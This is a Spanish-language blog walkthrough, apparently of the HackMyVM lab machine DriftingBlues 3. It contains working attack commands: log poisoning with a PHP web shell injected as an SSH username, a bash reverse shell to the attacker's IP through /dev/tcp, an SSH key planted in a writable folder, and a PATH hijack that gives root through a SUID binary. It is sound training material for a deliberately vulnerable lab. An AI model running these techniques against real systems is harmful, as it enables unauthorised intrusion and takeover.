---
layout: post
title: DriftingBlues 3
date: 2023-04-12
author: BlackCage
categories: [HackMyVM]
tags: [HMV, Enumeration, Base64, Path Hijacking]
---

# DriftingBlues 3 [ Hack My VM ]
![light mode only](/assets/img/imgs/driftingblues3/logo.jpg){: .light }
![dark mode only](/assets/img/imgs/driftingblues3/logo_black.png){: .dark }

# Reconocimiento
### NMAP
```
# Nmap 7.93 scan initiated Wed Apr 12 10:28:20 2023 as: nmap -sCV -p22,80 -oN targeted 192.168.1.113
Nmap scan report for 192.168.1.113
Host is up (0.00039s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6afed61723cb90792bb12d3753974658 (RSA)
|   256 5bc468d18959d748b096f311871c08ac (ECDSA)
|_  256 613966881d8ff1d040611e99c51a1ff4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/eventadmins
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:62:A5:64 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 12 10:28:40 2023 -- 1 IP address (1 host up) scanned in 19.74 seconds
```

Vemos que el puerto `22` está abierto, pero por el momento no nos sirve.

### Inspección Manual
![index](/assets/img/imgs/driftingblues3/index.png)

Vemos una página sin mucha relevancia, pasemos a la entrada que estaba en el fichero `robots.txt` que **NMap** descubrió:

```
man there's a problem with ssh

john said "it's poisonous!!! stay away!!!"

idk if he's mentally challenged

please find and fix it

also check /littlequeenofspades.html

your buddy, buddyG
```

Es una nota de un tal **BuddyG**. Dice que **John** le dijo que hay un problema con **SSH**, que es **venenoso**. También vemos que menciona un fichero **HTML**, vamos a verlo:

![queenofspades](/assets/img/imgs/driftingblues3/queenofspades.png)

**Queen of Spades** es una canción de **Robert Johnson**, no es nada importante, es sólo la letra de la canción, aunque hay algo extraño al final.

Se trata de una frase codeada en **Base64**, vamos a ver lo que dice:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/DriftingBlues3]
└─# echo "aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==" | base64 -d
intruder? L2FkbWluc2ZpeGl0LnBocA==
```

Vemos que hay otra cadena en **Base64**, vamos a ver qué contiene:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/DriftingBlues3]
└─# echo "L2FkbWluc2ZpeGl0LnBocA==" | base64 -d
/adminsfixit.php
```

¡Bien! Hemos encontrado otro fichero, esta vez parece más prometedor.

# Movimiento Lateral
### Shell
![ssh-auth-log](/assets/img/imgs/driftingblues3/ssh_auth_log.png)

Vemos una nota, realmente no es importante aunque nos da una pista (indirectamente) de lo que tenemos que hacer. Más abajo de la nota vemos el **log** del servicio **SSH**.

Para poder explotar esto vamos a inyectar **PHP** como si fuera el usuario al que nos queremos conectar, vamos a verlo:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/DriftingBlues3]
└─# ssh '<?php system($_GET['cmd']);?>'@192.168.1.113
<?php system($_GET[cmd]);?>@192.168.1.113: Permission denied (publickey).
```

Lo que hemos hecho es un **One Liner** en **PHP** que nos permitirá enviar una petición **GET** al fichero con el parámetro "**cmd**", el cual nos permitirá pasarle un comando y este lo ejecutará.

Para obtener una `Shell` me fui a [IronHackers](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/) y me copié la `Reverse Shell` en **Bash**. La edité para que apuntara a mi equipo y al puerto que yo quisiera, en mi caso el `4444`.

Una vez con esto hecho me puse en escucha con **NetCat**:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/DriftingBlues3]
└─# nc -nlvp 4444
listening on [any] 4444 ...
```

Con esto hecho ya estamos listos para poder enviarnos la `Shell` a nuestro equipo, para ello haremos lo siguiente:

```
http://192.168.1.113/adminsfixit.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.105/4444 0>%261"
```

> Cuando tenemos una situación así siempre es mejor URLEncodear los símbolos "**&**" (**%26**).
{: .prompt-tip }

Una vez le demos al `enter` recibiremos instamtáneamente la `Shell`:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/DriftingBlues3]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.1.105] from (UNKNOWN) [192.168.1.113] 35540
bash: cannot set terminal process group (539): Inappropriate ioctl for device
bash: no job control in this shell
www-data@driftingblues:/var/www/html$
```

¡Estupendo! Ya estamos en la máquina como **www-data**, pasemos a la escalada de privilegios.

### Subida de privilegios #1
Antes de conseguir el **control total** de la máquina tenemos que pasar por un usuario, en este caso por **RobertJ**.

Para poder conseguirlo nos iremos a su directorio de trabajo (`/home/robertj/`{: .filepath }). Una vez ahí veremos que tenemos permisos de escritura en la carpeta `.ssh`{: .filepath }:

```sh
www-data@driftingblues:/home/robertj$ ls -la
total 16
drwxr-xr-x 3 robertj robertj 4096 Jan  7  2021 .
drwxr-xr-x 4 root    root    4096 Jan  4  2021 ..
drwx---rwx 2 robertj robertj 4096 Jan  4  2021 .ssh
-r-x------ 1 robertj robertj   33 Jan  7  2021 user.txt
```

Vámonos a nuestro equipo y copiemos nuestra clave **id_rsa** pública:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/DriftingBlues3]
└─# cat /root/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvXhGKzMaH9rs8MkTDjzIKjjFb3LTeikSurAEFJ7WZrKmGU3FFqeQwUrJKV0Cc4W/ikKFD6jffd9k8C/vHP/XsMeZr2Rkd88YHVTtytEXTQYeodRmsCn1DQztf3v2ktb0o7bufldoPqX0dmUjEjpizQD6kmQ8Vy4hGHUofHobfylz8hLbTlZyoE566y+quHuOdQ/3C9H0gn1KHDOqN5fbQ7jL5wmilN/O7dlV8LAXSmHOVXAVJs/lM7hOfcVw63JGWa999LA3FoUhc30+ZDHKndzcC+ocomDwzum7yTz0imEG9izxuuSj4JmzuAmrN+XoXKwdIi6J//FFNLWZJa5ZUopAk3x7A2S+5i6WfnmgkyJ6c3HtiG8uE9eCdZMNLfwoH1gJJAvZ+DfwuUkDzXbIFArXhEjqtZz+jyemUYDDHfCF+cYG8wpqWhc48Lve2IQl/1Q9fC5QAftFz7XTvZUS1xLS15xDly3ALJy+cDQ59bjLUogCUYy+04L6k3bR4PH8= root@kali
```

Una vez copiada nuestra clave podemos irnos a la máquina víctima y crear un fichero en la carpeta `.ssh`{: .filepath } llamado **authorized_keys**. En este documento pegaremos nuestra clave pública:

```sh
www-data@driftingblues:/home/robertj/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvXhGKzMaH9rs8MkTDjzIKjjFb3LTeikSurAEFJ7WZrKmGU3FFqeQwUrJKV0Cc4W/ikKFD6jffd9k8C/vHP/XsMeZr2Rkd88YHVTtytEXTQYeodRmsCn1DQztf3v2ktb0o7bufldoPqX0dmUjEjpizQD6kmQ8Vy4hGHUofHobfylz8hLbTlZyoE566y+quHuOdQ/3C9H0gn1KHDOqN5fbQ7jL5wmilN/O7dlV8LAXSmHOVXAVJs/lM7hOfcVw63JGWa999LA3FoUhc30+ZDHKndzcC+ocomDwzum7yTz0imEG9izxuuSj4JmzuAmrN+XoXKwdIi6J//FFNLWZJa5ZUopAk3x7A2S+5i6WfnmgkyJ6c3HtiG8uE9eCdZMNLfwoH1gJJAvZ+DfwuUkDzXbIFArXhEjqtZz+jyemUYDDHfCF+cYG8wpqWhc48Lve2IQl/1Q9fC5QAftFz7XTvZUS1xLS15xDly3ALJy+cDQ59bjLUogCUYy+04L6k3bR4PH8=" > authorized_keys
```

¡Bien! Vámonos a nuestra máquina de nuevo e iniciemos sesión como **RobertJ** por **SSH**, ¡no nos pedirá contraseña!

### Subida de privilegios #2
Para este paso necesitaremos listar los binarios con permisos **`SUID`**:

```sh
robertj@driftingblues:/tmp$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/getinfo
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
```

Vemos un binario no muy común llamado **getinfo**, vamos a verlo por dentro:

![getinfo_command](/assets/img/imgs/driftingblues3/getinfo_command.png)

Vemos que está utilizando varios comandos, entre ellos, `Cat`. Para poder explotar esto tendremos que irnos a la carpeta `/tmp/`{: .filepath } (por comodidad) y crear un fichero que se llame igual, es decir, `cat`.

Una vez hecho lo anterior debemos escribir "`bash`" dentro del fichero, de esta manera se nos otorgará una `Shell` como `root`. Una vez ya hecho debemos darle permisos de ejecución:

```sh
robertj@driftingblues:~$ cd /tmp/
robertj@driftingblues:/tmp$ echo "bash" > cat
robertj@driftingblues:/tmp$ chmod +x cat
```

Bien, ya estamos casi listos para ganar el **control total**, solo nos queda redefinir la variable de entorno **`PATH`** para que busque primero en `/tmp/`{: .filepath }:

```sh
robertj@driftingblues:/tmp$ export PATH=/tmp:$PATH
robertj@driftingblues:/tmp$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

¡Bien! Ahora sí estamos completamente listos para poder ejecutar de nuevo `getinfo`, vamos allá:

```
robertj@driftingblues:/tmp$ /usr/bin/getinfo
###################
ip address
###################

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 08:00:27:42:05:17 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.113/24 brd 192.168.1.255 scope global dynamic enp0s3
       valid_lft 85844sec preferred_lft 85844sec
    inet6 fe80::a00:27ff:fe42:517/64 scope link 
       valid_lft forever preferred_lft forever
###################
hosts
###################

root@driftingblues:/tmp#
```

¡Enhorabuena! Ya estamos como `root` en la máquina. ¡Qué fácil!